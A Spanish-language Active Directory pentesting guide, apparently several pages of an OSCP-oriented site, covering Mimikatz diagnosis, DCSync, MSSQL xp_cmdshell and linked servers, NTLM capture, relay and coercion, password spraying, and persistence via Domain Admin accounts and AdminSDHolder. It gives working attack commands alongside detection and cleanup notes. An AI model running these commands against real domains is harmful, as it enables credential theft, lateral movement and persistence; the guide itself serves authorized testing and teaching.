El error más común en OSCP es asumir que "Mimikatz no va" = "el antivirus". Diagnostica primero:

\`\`\`text
Mimikatz no funciona
   ↓
¿El archivo fue eliminado/puesto en cuarentena?     → AV estático
   ↓
¿La ejecución fue bloqueada al lanzarlo?            → AV/EDR en ejecución
   ↓
¿PowerShell bloqueó el comando?                     → AMSI / Execution Policy
   ↓
¿sekurlsa no devuelve credenciales pero no hay error? → Credential Guard
   ↓
¿Mensaje de privilegio?                              → faltan permisos (no es AV)
   ↓
¿Error de sintaxis del comando?                      → no es AV
\`\`\`

Distingue estos cinco casos — son soluciones distintas:

| Observas | Es probablemente |
|---|---|
| El \`.exe\` desaparece al copiarlo / "Threat found" | AV detection (estático) |
| Error de privilegio (\`SeDebugPrivilege\`) | Permission error |
| \`sekurlsa\` sin resultados y sin error | Credential Guard |
| \`KuhL\` / error interno de Mimikatz | Mimikatz error (versión/arquitectura) |
| "Unknown command" / parámetros mal | Incorrect syntax |

### Windows Defender (diagnóstico en lab)

Comprobaciones **de lectura** para entender qué pasó (en un laboratorio autorizado):

\`\`\`powershell
Get-MpComputerStatus              # ¿Defender activo? RealTimeProtection, AMSI, etc.
Get-MpThreatDetection             # Detecciones recientes
Get-MpThreat                      # Amenazas conocidas en el historial
# Historial de protección / eventos de Defender
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -MaxEvents 20
\`\`\`

> Estas comprobaciones son **diagnósticas** (leen estado y eventos). Esta guía no incluye cómo desactivar Defender, añadir exclusiones ni ofuscar: el objetivo es entender la detección y elegir una técnica compatible con el alcance del laboratorio.

### AMSI (concepto)

\`\`\`text
PowerShell → AMSI → inspección del contenido → detección
\`\`\`

AMSI entrega el contenido que se va a ejecutar (scripts, bloques de PowerShell) al motor antimalware **en el momento de ejecutarse**. Por eso una herramienta puede detectarse aunque se cargue "desde memoria": lo que se inspecciona es el contenido en ejecución, no solo el archivo en disco.

***

## Metodología OSCP: ¿Mimikatz bloqueado? ¿Qué hago?

\`\`\`text
1. Confirmar que realmente hay un bloqueo (no permisos ni sintaxis)
      ↓
2. Identificar qué componente lo bloquea (AV / AMSI / EDR / Credential Guard)
      ↓
3. ¿El problema es detección o privilegios?
      ↓
4. ¿Existe otra vía al MISMO objetivo?
      ↓
5. Usar una técnica compatible con el entorno autorizado
      ↓
6. Validar el resultado
\`\`\`

La pregunta correcta no es "¿cómo ejecuto Mimikatz?", sino **"¿qué material de credenciales necesito y qué otra implementación legítima lo consigue?"**.

### Alternativas (technique → tool)

Piensa en la **técnica** y luego elige herramienta:

| Objetivo (técnica) | Posibles herramientas |
|---|---|
| DCSync | Mimikatz / **Impacket** (\`secretsdump\`) / **NetExec** (\`--ntds\`) |
| Extracción de NTDS | \`secretsdump\` / \`ntdsutil\` / VSS |
| Tickets Kerberos | Rubeus / Mimikatz |
| Enumeración LDAP | \`ldapsearch\` / PowerView |
| BloodHound | SharpHound / \`bloodhound-python\` |
| Pass the Hash | NetExec / Impacket / Mimikatz |

Muchas de estas corren **desde Linux** (Impacket, NetExec, bloodhound-python), fuera del alcance de un AV/EDR centrado en el endpoint Windows — lo que a menudo resuelve el bloqueo sin tocar defensas.

### AV/EDR y DCSync

DCSync es el mejor ejemplo de "técnica por encima de herramienta": la misma técnica tiene tres implementaciones habituales.

\`\`\`text
Mimikatz  → lsadump::dcsync  ┐
Impacket  → secretsdump      ├─→  DRSUAPI → Domain Controller → Credential Material
NetExec   → --ntds           ┘
\`\`\`

Si Mimikatz está bloqueado en el endpoint, \`secretsdump\` o \`nxc --ntds\` desde Kali consiguen **lo mismo** (ver [DCSync](/pentesting/active-directory/dcsync)). El objetivo era DCSync, no Mimikatz.

***

## OSCP mindset: si una herramienta está bloqueada, no te atasques

Abstrae siempre a **objetivo → técnica → herramienta**:

\`\`\`text
Mimikatz → BLOQUEADO → ¿qué quería? → DCSync
   → ¿otra implementación? → Impacket / NetExec

Rubeus → BLOQUEADO → ¿qué necesito? → un ticket Kerberos
   → ¿otra vía? → GetUserSPNs.py / getTGT.py (Impacket) desde Linux
\`\`\`

El error es razonar "herramienta → comando". El acierto es "objetivo → técnica → herramienta disponible en el entorno".

***

## AV/EDR evasion — contexto educativo

Conceptos que conviene **entender** (para diagnosticar y adaptar la metodología de laboratorio), no recetas operativas:

- **Signature-based detection**: coincidencia con firmas conocidas.
- **Heuristic detection**: patrones sospechosos sin firma exacta.
- **Behavioral detection**: acciones (abrir LSASS, inyección) más que archivos.
- **Memory scanning**: análisis de la memoria de procesos.
- **AMSI**: inspección de contenido en ejecución.
- **EDR telemetry**: eventos correlacionados.
- **Process injection** (concepto): ejecutar en el espacio de otro proceso.
- **Living-off-the-land / LOLBins** (concepto): usar binarios legítimos del sistema.
- **In-memory execution** (concepto): evitar escribir en disco.
- **Payload staging** (concepto): cargar en fases.

> Esta sección es **conceptual y defensiva**: explica por qué una técnica funciona o se detecta. No contiene cadenas de bypass contra productos reales. En un ejercicio autorizado, qué está permitido lo fijan las *rules of engagement*.

***

## Laboratorio didáctico (attack → detection → adaptation)

\`\`\`text
Kali → Windows 11 / Server → Microsoft Defender → Active Directory
\`\`\`

Objetivo: **obtener credenciales de laboratorio** y entender la detección.

\`\`\`text
1. Ejecutar la técnica con la herramienta habitual
2. Observar la detección (qué salta y cuándo)
3. Identificar el componente (AV / AMSI / EDR / Credential Guard)
4. Analizar los logs (Defender Operational, Security)
5. Probar una alternativa autorizada (otra implementación/host)
6. Comparar resultados
7. Documentar
\`\`\`

El valor pedagógico está en el ciclo **ATTACK → DETECTION → ADAPTATION**, no en "saltarse" nada.

***

## Detección de Mimikatz (visión defensiva / SOC)

Qué observa un defensor, útil para documentar la evidencia de tu prueba:

- Ejecución de herramientas conocidas (firma/hash).
- **Acceso a LSASS** por procesos no habituales (handle con permisos de lectura de memoria).
- Actividad de PowerShell (ScriptBlock Logging 4104) y alertas AMSI.
- **DCSync**: Event ID 4662 con los GUID de replicación (ver [DCSync → Detección](/pentesting/active-directory/dcsync)).
- Eventos de autenticación anómalos (uso de hashes/tickets).

> **Información adicional (MITRE ATT&CK).** Mapeos habituales: *OS Credential Dumping* — LSASS \`T1003.001\`, SAM \`T1003.002\`, LSA Secrets \`T1003.004\`, DCSync \`T1003.006\`; uso de material alternativo (PtH/PtT) \`T1550\`. Son referencias externas de contexto.

***

## Troubleshooting

No asumas que todo problema es AV:

| Problema | Posible causa |
|---|---|
| \`privilege::debug\` falla | Privilegios insuficientes (no admin local) |
| El binario se elimina solo | AV detection (estático) |
| PowerShell bloquea el comando | AMSI / Execution Policy |
| \`sekurlsa\` no devuelve credenciales (sin error) | Credential Guard / protección de LSASS |
| DCSync falla | Faltan replication rights (ver [DCSync](/pentesting/active-directory/dcsync)) |
| \`secretsdump\` funciona pero Mimikatz no | Diferencia de implementación / detección en el endpoint |
| El ticket no funciona | Kerberos: clock skew / SPN / credenciales |

***

## Decision tree

\`\`\`text
¿Necesito Credential Dumping? → ¿qué objetivo?
   ├── NTDS     → DCSync / extracción de NTDS
   ├── LSASS    → acceso a credenciales en memoria
   └── Kerberos → extracción/forja de tickets

¿La herramienta principal está bloqueada?
   ↓
Identificar el motivo
   ├── ¿Privilegios?  → corregir contexto/permisos (no es AV)
   └── ¿Detección?    → buscar otra IMPLEMENTACIÓN de la misma técnica
                         (p. ej. Impacket/NetExec desde Linux)
\`\`\`

***

## Checklist

- [ ] Identificar el objetivo (técnica, no herramienta)
- [ ] Identificar privilegios actuales
- [ ] Ejecutar la técnica en laboratorio
- [ ] Comprobar si interviene el AV
- [ ] Comprobar AMSI
- [ ] Comprobar EDR
- [ ] Revisar logs (Defender / Security)
- [ ] Determinar la causa del bloqueo (AV / AMSI / EDR / Credential Guard / permisos / sintaxis)
- [ ] Identificar una alternativa técnica
- [ ] Validar el resultado
- [ ] Documentar la detección observada
- [ ] Documentar la técnica/herramienta utilizada

***

## Integración

\`\`\`text
Credential Dumping → Mimikatz → LSASS / DCSync / NTDS / Kerberos
   → Credentials → Pass the Hash / Pass the Ticket → Lateral Movement → Domain Dominance
\`\`\`

- Hub de volcado de credenciales: [Credential Dumping](/pentesting/active-directory/credential-dumping).
- Técnica de replicación: [DCSync](/pentesting/active-directory/dcsync).
- Uso de credenciales: [Lateral Movement](/pentesting/active-directory/lateral-movement) · [Tickets](/pentesting/active-directory/tickets).
- OPSEC general del dominio: [Persistence y OPSEC](/pentesting/active-directory/persistence-opsec).
`,Pr=`MSSQL es un vector habitual de movimiento lateral en entornos AD cuando las cuentas de servicio o los Linked Servers están mal configurados, y los Forest Trusts amplían la superficie de ataque entre dominios distintos. Esta guía cubre ambos temas: enumeración y abuso de instancias MSSQL, y el análisis de relaciones de confianza entre forests.

## MSSQL en Active Directory

En AD, las instancias de MSSQL suelen autenticarse de dos formas: **Windows Authentication** (la instancia confía en el dominio y usa cuentas AD/Kerberos o NTLM) o **SQL Authentication** (usuario y contraseña propios de la instancia, independientes del dominio). Muchas instancias se ejecutan bajo una cuenta de servicio de dominio, lo que las convierte en un objetivo interesante: comprometer la instancia puede dar acceso al contexto de esa cuenta de servicio.

Un **Linked Server** es una configuración que permite a una instancia MSSQL ejecutar consultas contra otra instancia (local o remota) como si fuera parte de la misma sesión. Si el Linked Server está configurado con credenciales de mayor privilegio que las del usuario actual, se puede abusar para escalar o moverse lateralmente.

\`xp_cmdshell\` es un procedimiento almacenado extendido que permite ejecutar comandos del sistema operativo desde una sesión SQL, en el contexto de la cuenta de servicio de la instancia. Está deshabilitado por defecto en instancias modernas, pero una cuenta con privilegios \`sysadmin\` puede habilitarlo.

**Desde Linux**

\`\`\`bash
# Conexión con Windows Authentication
mssqlclient.py <dominio>/<usuario>:<password>@<target> -windows-auth

# Conexión con SQL Authentication
mssqlclient.py <usuario>:<password>@<target>

# NetExec / CrackMapExec (nota: CME está deprecado en favor de NetExec, nxc)
nxc mssql <target> -u <usuario> -p '<password>' -x whoami
\`\`\`

**Desde Windows**

PowerUpSQL es el módulo de referencia para auditar MSSQL desde PowerShell: permite descubrir instancias en el dominio, comprobar permisos y enumerar Linked Servers.

\`\`\`powershell
Import-Module .\\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLServerLinkCrawl -Instance <target>
\`\`\`

> **Solo laboratorio / entorno autorizado.** Habilitar \`xp_cmdshell\` modifica la configuración de la instancia y puede dejar rastro persistente; hazlo solo como prueba de concepto controlada.

\`\`\`sql
-- Habilitar xp_cmdshell (requiere sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Uso
EXEC xp_cmdshell 'whoami';
\`\`\`

> **Cleanup.** Vuelve a deshabilitar \`xp_cmdshell\` al terminar: \`EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\`.

***

### Linked Servers

Para descubrir Linked Servers configurados en la instancia actual:

\`\`\`sql
EXEC sp_linkedservers;
\`\`\`

Consultar datos a través de un Linked Server con \`OPENQUERY\`:

\`\`\`sql
SELECT * FROM OPENQUERY([LINKED], 'SELECT name FROM sys.databases');
\`\`\`

Ejecutar comandos en el servidor enlazado (si la cuenta usada en el link tiene privilegios suficientes, esto puede incluir \`xp_cmdshell\` en el servidor remoto):

\`\`\`sql
EXECUTE('xp_cmdshell ''whoami''') AT [LINKED];
\`\`\`

Un escenario típico de abuso encadenado:

\`\`\`text
SQLSERVER-1 (acceso inicial)
    ↓ Linked Server (credenciales de mayor privilegio)
SQLSERVER-2
    ↓ instancia corre bajo cuenta de dominio
cuenta de servicio de dominio
    ↓ la cuenta pertenece a un grupo privilegiado
Domain Admin
\`\`\`

**Interpretación:** si SQLSERVER-1 tiene un Linked Server hacia SQLSERVER-2 y este último ejecuta la instancia bajo una cuenta de dominio con privilegios elevados (por ejemplo, miembro de un grupo administrativo), el abuso del Linked Server permite ejecutar comandos en el contexto de esa cuenta sin necesidad de conocer su contraseña.

**Siguiente paso:** tras obtener ejecución de comandos en el contexto de la cuenta de servicio, continúa con [credential-dumping](/pentesting/active-directory/credential-dumping) para extraer credenciales en memoria o en disco, y evalúa las opciones de [lateral-movement](/pentesting/active-directory/lateral-movement) con el contexto obtenido.

***

## Forest Trusts

Un **Forest** es la unidad de aislamiento de seguridad más alta en Active Directory; puede contener varios dominios. Un **Trust** (relación de confianza) permite que los usuarios de un dominio o forest se autentiquen en otro. Las confianzas pueden ser **transitivas** (se propagan a dominios hijos/relacionados) o no, y de una dirección o bidireccionales.

**SID Filtering** es una protección que, en confianzas entre forests, descarta SIDs que no pertenecen al dominio de origen esperado, mitigando el abuso de **SID History** (un atributo que permite a un objeto "heredar" los SIDs de otro, usado legítimamente en migraciones). **Selective Authentication** restringe qué principals del forest de confianza pueden autenticarse contra recursos específicos del forest local, en lugar de confianza abierta a todo el forest.

**Enumeración**

| | Linux | Windows |
|---|---|---|
| Herramienta | NetExec / Impacket | PowerView |

**Desde Windows (PowerView)**

\`\`\`powershell
Get-DomainTrust
Get-ForestDomain
Get-DomainTrustMapping
\`\`\`

**Desde Linux**

\`\`\`bash
nxc ldap <dc-ip> -u <usuario> -p '<password>' -M enum_trusts
\`\`\`

BloodHound también recopila relaciones de trust y las representa como aristas navegables en el grafo; ver [bloodhound](/pentesting/active-directory/bloodhound).

**Interpretación de los campos de un trust:**

- **Trust Direction**: entrante, saliente o bidireccional — determina en qué sentido se puede autenticar.
- **Trust Type**: parent-child, tree-root, external, forest, realm — afecta a qué protecciones aplican por defecto.
- **SID Filtering**: si está activo, limita qué SIDs del dominio/forest remoto son aceptados, lo que reduce el impacto de un abuso de SID History.
- **Authentication**: si es Selective, el acceso efectivo depende de permisos adicionales configurados recurso por recurso, no solo de la existencia del trust.

> **Solo laboratorio / entorno autorizado.** Los ataques cross-forest (por ejemplo, abuso de SID History o de la clave del trust para forjar tickets entre forests) dependen fuertemente de la configuración de SID Filtering y del tipo de trust; no son aplicables de forma universal y su éxito debe verificarse caso por caso en el laboratorio, nunca asumirse.

A alto nivel, cuando un trust permite el abuso (SID Filtering desactivado o insuficiente), el camino de ataque suele apoyarse en los mismos conceptos que un Golden Ticket pero extendidos al forest de confianza; revisa [tickets](/pentesting/active-directory/tickets) para la mecánica de forja de tickets y [credential-dumping](/pentesting/active-directory/credential-dumping) para la obtención de las claves necesarias.
`,Fr=`La captura y la coerción de autenticación NTLM aprovechan debilidades de resolución de nombres y de protocolos RPC para obligar a un host, a menudo un Domain Controller, a autenticarse contra una máquina controlada por el atacante. Esta página distingue claramente entre capturar un hash para crackearlo, reenviarlo (relay) y forzar esa autenticación mediante coerción.

## Responder y captura NTLM

### ¿Qué es?

Cuando un host falla al resolver un nombre vía DNS, muchos entornos Windows caen de forma automática en protocolos de resolución heredados: LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service) y WPAD (Web Proxy Auto-Discovery). Un atacante en la misma red puede responder a estas consultas haciéndose pasar por el host solicitado, lo que provoca que la víctima inicie autenticación NTLM contra él.

### ¿Por qué funciona?

LLMNR y NBT-NS no autentican al respondedor: cualquier host en el segmento puede contestar primero y ser aceptado como legítimo. Si además el SMB signing no está forzado en el host atacante (el propio Responder), la víctima completa un handshake NTLM que queda expuesto.

### Concepto

\`\`\`text
la víctima intenta resolver un nombre que falla en DNS
    ↓
consulta por LLMNR / NBT-NS en la red local
    ↓
Responder contesta haciéndose pasar por el host solicitado
    ↓
la víctima envía autenticación NTLM contra el atacante
    ↓
hash capturado (NetNTLMv2) ── o ── reenvío (relay) a otro destino
\`\`\`

### Comando

\`\`\`bash
responder -I <iface>
\`\`\`

### Detección

Tráfico LLMNR/NBT-NS inusual, alertas de IDS por múltiples respuestas a una misma consulta, y monitorización de Responder/Inveigh en la red.

***

## Capture → Crack vs Capture → Relay

Capturar un hash NetNTLMv2 no es lo mismo que reenviarlo: son dos ataques distintos con requisitos y resultados diferentes.

### Capture → Crack

El hash NetNTLMv2 capturado es un hash de reto-respuesta: no sirve para Pass-the-Hash, debe crackearse offline para recuperar la contraseña en claro.

\`\`\`bash
hashcat -m 5600 hashes.txt wordlist.txt
\`\`\`

Ver más técnicas de cracking en [Ataques de contraseñas](/pentesting/active-directory/password-attacks).

### Capture → Relay

En lugar de crackear el hash, se reenvía la sesión de autenticación en tiempo real hacia otro servicio que acepte NTLM, evitando necesitar la contraseña en claro.

\`\`\`bash
ntlmrelayx.py -t <target> -smb2support
\`\`\`

**Requisito clave**: el host destino no debe tener SMB signing forzado; si lo tiene, el relay a SMB falla aunque la captura funcione.

Con \`--escalate-user\` se puede añadir la cuenta relayeada a un grupo privilegiado, o relayear directamente contra LDAP/LDAPS para escalar vía ADCS (ver [AD CS](/pentesting/active-directory/adcs)).

> **Solo laboratorio / entorno autorizado.** El relay de autenticación NTLM afecta a cuentas y servicios reales del dominio; practícalo solo en laboratorio o con autorización explícita.

### Si falla

- Relay rechazado (\`STATUS_NOT_SUPPORTED\` o similar): el destino tiene SMB signing forzado; buscar otro destino o relayear a un protocolo distinto (LDAP, HTTP, ADCS).
- Ningún hash capturado: revisar que la víctima realmente falla la resolución DNS para el nombre consultado.

***

## Coercion

### ¿Qué es?

La coerción consiste en forzar activamente a un host, habitualmente un Domain Controller, a iniciar autenticación NTLM contra una máquina del atacante, en lugar de esperar a que ocurra de forma pasiva.

### Concepto

\`\`\`text
se invoca una función RPC expuesta por el servicio (Spooler, EFSRPC, ...)
    ↓
el host objetivo intenta autenticarse contra el listener del atacante
    ↓
autenticación NTLM recibida
    ↓
capturar el hash ── o ── reenviar (relay) a otro destino
\`\`\`

### Técnicas

**PrinterBug** (abusa del servicio Print Spooler)

Desde Linux:

\`\`\`bash
printerbug.py <dominio>/<usuario>:<password>@<target> <listener-ip>
\`\`\`

Desde Windows: \`SpoolSample.exe <target> <listener-ip>\`.

**PetitPotam** (abusa de EFSRPC, no requiere credenciales en algunos casos)

\`\`\`bash
PetitPotam.py -u <usuario> -p <password> <listener-ip> <target>
\`\`\`

**Coercer** (prueba automáticamente varios métodos de coerción)

\`\`\`bash
coercer coerce -u <usuario> -p <password> -t <target> -l <listener-ip>
\`\`\`

### Requisitos

- Conectividad hacia el servicio RPC correspondiente del objetivo (Spooler para PrinterBug, EFSRPC para PetitPotam).
- Un listener (propio o \`ntlmrelayx.py\`) escuchando en \`<listener-ip>\` para recibir la autenticación.

### Relación con otras técnicas

- **Coerción + NTLM Relay**: forzar a un Domain Controller a autenticarse y reenviar esa autenticación hacia LDAP/LDAPS o hacia AD CS para obtener un certificado o escalar privilegios (ver [AD CS](/pentesting/active-directory/adcs)).
- **Coerción + Unconstrained Delegation**: forzar al DC a autenticarse contra un servidor con unconstrained delegation para capturar su TGT completo (ver [Delegación](/pentesting/active-directory/delegation)).

### Detección

Conexiones RPC inesperadas al servicio Spooler o EFSRPC desde hosts no habituales, y autenticaciones NTLM salientes del propio DC hacia IPs externas al rol que debería tener.

> **Solo laboratorio / entorno autorizado.** Forzar la autenticación de un Domain Controller puede tener efectos sobre servicios de producción; practícalo solo en laboratorio o con autorización explícita.

### Si falla

- Sin respuesta del objetivo: el servicio Spooler puede estar deshabilitado (mitigación común tras divulgación de PrinterBug); probar PetitPotam o Coercer con otros métodos.
- Acceso denegado al invocar la función RPC: revisar si el método requiere credenciales válidas o si hay filtrado de red hacia el puerto RPC.
`,Ir=`Los ataques de contraseñas sobre Active Directory son, en apariencia, la técnica más simple del árbol de ataque — y al mismo tiempo la que con más facilidad puede causar un incidente real si se ejecuta sin disciplina. Esta página cubre la diferencia entre fuerza bruta y spraying, el flujo seguro de spraying, la reutilización de credenciales entre servicios, y los modos de hashcat relevantes para crackear el material obtenido en otras técnicas de AD.

## Brute Force vs Password Spraying

| | Fuerza bruta | Password Spraying |
|---|---|---|
| Objetivo | Un usuario, muchas contraseñas | Muchos usuarios, una (o pocas) contraseña |
| Riesgo de bloqueo | Alto — supera rápido el lockout threshold de esa cuenta | Bajo si se respeta el threshold — cada usuario solo recibe un intento |
| Caso de uso típico | Se conoce o sospecha una contraseña débil de un usuario concreto | Contraseñas estacionales/corporativas comunes (\`Verano2024!\`, \`Empresa123\`) probadas ampliamente |

El spraying evita bloqueos porque **distribuye** el riesgo: en lugar de agotar los intentos permitidos contra una sola cuenta, se prueba una única contraseña candidata contra todo el conjunto de usuarios, manteniéndose siempre por debajo del \`Account Lockout Threshold\` de cada cuenta individual.

***

## Password Spraying

> **Solo laboratorio / entorno autorizado.** El spraying contra cuentas reales fuera de un alcance explícitamente autorizado puede bloquear usuarios legítimos de una organización. Ejecutar únicamente dentro del scope acordado y con la política de bloqueo ya enumerada.

**Workflow recomendado**

\`\`\`text
Obtener lista de usuarios (OSINT, LDAP, RID cycling)
        ↓
Validar qué usuarios existen realmente en el dominio
        ↓
Enumerar la password policy (ver /pentesting/active-directory/smb-sysvol)
        ↓
Determinar el lockout threshold y la lockout duration
        ↓
Elegir UNA contraseña candidata razonada (política de la empresa, temporada, filtraciones)
        ↓
Ejecutar una única prueba controlada contra TODOS los usuarios
        ↓
Analizar resultados (accesos válidos, errores, bloqueos inesperados)
        ↓
Si es necesario repetir, esperar el tiempo que marca la lockout duration
\`\`\`

**Comandos**

\`\`\`bash
# CrackMapExec / NetExec
crackmapexec smb <dc-ip> -u users.txt -p '<password>' --continue-on-success
nxc smb <dc-ip> -u users.txt -p '<password>' --continue-on-success

# Kerbrute (spray vía Kerberos, no genera eventos de login NTLM)
kerbrute passwordspray -d <dominio> --dc <dc-ip> users.txt '<password>'
\`\`\`

\`\`\`text
SMB   <dc-ip>  445  DC01  [+] <dominio>\\jgarcia:Verano2024! 
SMB   <dc-ip>  445  DC01  [+] <dominio>\\mlopez:Verano2024! 
SMB   <dc-ip>  445  DC01  [-] <dominio>\\asanchez:Verano2024! STATUS_LOGON_FAILURE
\`\`\`

**Interpretación.** Cada \`[+]\` es una credencial válida nueva. Los \`[-]\` no cuentan como intentos adicionales sobre la misma cuenta si la ronda no se repite — por eso una sola ronda bien planificada es la unidad de trabajo, no una ronda por contraseña sin control.

> **Nota.** Respeta siempre el alcance autorizado y la política de bloqueo de cuentas enumerada previamente — ver [Password Policy](/pentesting/active-directory/smb-sysvol#password-policy). Nunca se debe exceder el \`Account Lockout Threshold\` en una misma ventana de tiempo.

**Si falla…**

| Error | Causa probable |
|---|---|
| \`STATUS_LOGON_FAILURE\` | Usuario existe pero la contraseña no es correcta (esperado para la mayoría) |
| \`STATUS_ACCOUNT_LOCKED_OUT\` | Cuenta ya bloqueada — detener inmediatamente el spraying y revisar el threshold usado |
| Todos fallan sin distinción | Puede haber SMB signing forzado o filtrado de puertos — revisar conectividad |

***

## Credential Reuse

Una vez obtenida una credencial válida — ya sea por AS-REP Roasting, Kerberoasting, GPP, o spraying — es habitual que la misma contraseña (o una variante) esté reutilizada en otras cuentas o en otros equipos del mismo alcance autorizado.

\`\`\`bash
# Probar una credencial válida contra todo un rango de IPs dentro del scope
crackmapexec smb <rango> -u <usuario> -p <password>
nxc smb <rango> -u <usuario> -p <password>
\`\`\`

\`\`\`text
SMB   192.168.1.10   445  WS01    [+] <dominio>\\svc_backup:P@ssw0rd123! (Pwn3d!)
SMB   192.168.1.15   445  WS02    [-] <dominio>\\svc_backup:P@ssw0rd123! STATUS_LOGON_FAILURE
\`\`\`

**Interpretación.** La marca \`Pwn3d!\` que muestra NetExec/CrackMapExec indica que la credencial tiene privilegios de administrador local en esa máquina — un punto de apoyo directo para movimiento lateral. Como siempre, esto no implica privilegios de dominio; es simplemente administrador local en ese host concreto.

***

## Password Cracking

Tabla de referencia de los modos de hashcat más relevantes al trabajar sobre Active Directory:

| Modo hashcat | Tipo de hash | Origen típico |
|---|---|---|
| \`18200\` | AS-REP (\`$krb5asrep$\`) | [AS-REP Roasting](/pentesting/active-directory/kerberos) |
| \`13100\` | Kerberoast TGS (\`$krb5tgs$\`) | [Kerberoasting](/pentesting/active-directory/kerberos) |
| \`1000\` | NTLM | Dumps de SAM/NTDS, [credential dumping](/pentesting/active-directory/credential-dumping) |
| \`5600\` | NetNTLMv2 | Captura de hashes vía coerción/relay, ver [NTLM Coercion](/pentesting/active-directory/ntlm-coercion) |

\`\`\`bash
hashcat -m <modo> hashes.txt wordlist.txt
\`\`\`

**Alternativa con John the Ripper** cuando hashcat no está disponible o para formatos específicos:

\`\`\`bash
john --wordlist=wordlist.txt --format=krb5tgs hashes.txt
\`\`\`

**Resultado esperado**

\`\`\`text
sqlservice:Password123!
Session completed.
\`\`\`

**Interpretación.** Una contraseña crackeada es el punto de partida de la siguiente fase, no el objetivo final. Evalúa siempre a qué da acceso esa cuenta antes de considerarla un hito de la evaluación.
`,Lr=`La persistencia en Active Directory se diferencia claramente de la explotación temporal: mientras que técnicas como Kerberoasting o ACL abuse buscan un objetivo puntual, la persistencia busca mantener acceso a largo plazo tras la evaluación inicial. Esta guía cubre mecanismos de persistencia comunes en entornos AD y los conceptos de OPSEC asociados a la detección de un operador.

> **Solo laboratorio / entorno autorizado.** Todas las técnicas de esta página modifican el estado del dominio o el comportamiento de logging/seguridad del sistema. Aplícalas únicamente en laboratorios propios o en compromisos con autorización explícita, y revierte siempre los cambios al finalizar.

## Mecanismos de persistencia

### Usuario Domain Admin

Crear una cuenta propia y añadirla al grupo Domain Admins es la forma más directa (y más ruidosa) de persistencia.

**Prerequisites:** privilegios suficientes para crear objetos usuario en el dominio y modificar membresía de Domain Admins (típicamente ya Domain Admin o equivalente).

**Implementation**

\`\`\`text
net user <usuario-persistencia> <password> /add /domain
net group "Domain Admins" <usuario-persistencia> /add /domain
\`\`\`

**Verification**

\`\`\`text
net group "Domain Admins" /domain
\`\`\`

**Detection:** creación de cuenta y cambio de membresía de un grupo privilegiado generan eventos de seguridad (4720, 4728) fácilmente correlacionables; cualquier SOC maduro los alertará.

**Cleanup:** eliminar la cuenta creada.

\`\`\`text
net user <usuario-persistencia> /delete /domain
\`\`\`

***

### Group membership

En lugar de un grupo tan visible como Domain Admins, añadir la cuenta propia (o una ya existente bajo control) a un grupo con privilegios suficientes para el objetivo (por ejemplo, un grupo con delegación sobre OUs críticas) reduce algo la visibilidad, aunque el patrón de detección es similar.

**Prerequisites:** permisos de escritura sobre la membresía del grupo objetivo.

**Implementation**

\`\`\`text
net group "<grupo-privilegiado>" <usuario> /add /domain
\`\`\`

**Verification:** comprobar membresía del grupo y, si aplica, validar con BloodHound que el camino de privilegio esperado existe.

**Detection:** evento 4728/4756 según el tipo de grupo; también detectable por diffing periódico de membresías de grupos sensibles.

**Cleanup:** quitar al usuario del grupo.

\`\`\`text
net group "<grupo-privilegiado>" <usuario> /remove /domain
\`\`\`

***

### AdminSDHolder

**AdminSDHolder** es un objeto especial en AD cuya ACL se usa como plantilla para un conjunto de grupos y usuarios considerados "protegidos" (los **Protected Groups**: Domain Admins, Enterprise Admins, Schema Admins, Administrators, etc.). Un proceso en segundo plano llamado **SDProp** (Security Descriptor Propagator) compara periódicamente la ACL de AdminSDHolder con la de cada objeto protegido y la reaplica si detecta diferencias, sobrescribiendo cualquier modificación manual hecha directamente sobre esos objetos.

\`\`\`text
ACL de AdminSDHolder
    ↓ (SDProp compara y reaplica periódicamente)
ACL de objetos protegidos (Domain Admins, Enterprise Admins, ...)
\`\`\`

Esto se puede abusar para persistencia: si se añade una ACE propia (por ejemplo, control total o \`GenericAll\`) directamente sobre AdminSDHolder, SDProp propagará esa ACE a todos los objetos protegidos, otorgando persistencia incluso si la cuenta usada para el ataque es detectada y eliminada de los grupos, siempre que la ACE en AdminSDHolder permanezca.

El intervalo con el que se ejecuta SDProp suele ser de aproximadamente 60 minutos por defecto, pero este valor puede variar según la configuración del entorno y no debe asumirse como un dato fijo y universal; verifícalo en el laboratorio en cuestión si es relevante para la prueba.

**Prerequisites:** permisos de escritura sobre la ACL de AdminSDHolder (\`WriteDacl\` o equivalente).

**Implementation (PowerView, ejemplo conceptual)**

\`\`\`powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<dominio>,DC=com' -PrincipalIdentity <usuario> -Rights All
\`\`\`

**Verification:** tras un ciclo de SDProp, comprobar que la ACE aparece en un objeto protegido (por ejemplo, Domain Admins) y no solo en AdminSDHolder.

**Detection:** modificaciones a la ACL de AdminSDHolder son un indicador de persistencia muy conocido; herramientas de detección de AD y BloodHound (vía ACL edges) lo señalan explícitamente.

**Cleanup:** revertir la ACE añadida en AdminSDHolder.

\`\`\`powershell
Remove-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<dominio>,DC=com' -PrincipalIdentity <usuario> -Rights All
\`\`\`

***

### Golden Ticket / DCSync rights

La persistencia también puede lograrse a nivel de credenciales de alto valor, en lugar de membresías de grupo:

- Vía el hash de **krbtgt**, que permite forjar un **Golden Ticket** válido para cualquier usuario del dominio sin interactuar con el DC en cada uso; ver [tickets](/pentesting/active-directory/tickets) para la mecánica de forja.
- Vía derechos de replicación (**DCSync rights** — \`DS-Replication-Get-Changes\` / \`DS-Replication-Get-Changes-All\`) otorgados a una cuenta controlada, lo que permite volcar credenciales del dominio a demanda; ver [DCSync](/pentesting/active-directory/dcsync) y [acl-ace](/pentesting/active-directory/acl-ace) para el abuso de estos derechos.

**Detection:** uso anómalo de tickets con tiempos de vida fuera de política, o concesión de derechos de replicación a cuentas no administrativas, son ambos indicadores de persistencia de alto valor.

**Cleanup:**

- Para Golden Ticket: rotar el hash de **krbtgt** dos veces consecutivas (la segunda rotación invalida tickets forjados con el hash anterior, ya que AD conserva el valor previo y el actual).
- Para DCSync rights: eliminar los derechos de replicación otorgados a la cuenta no autorizada.

***

## Defense Evasion / OPSEC (educativo / laboratorio)

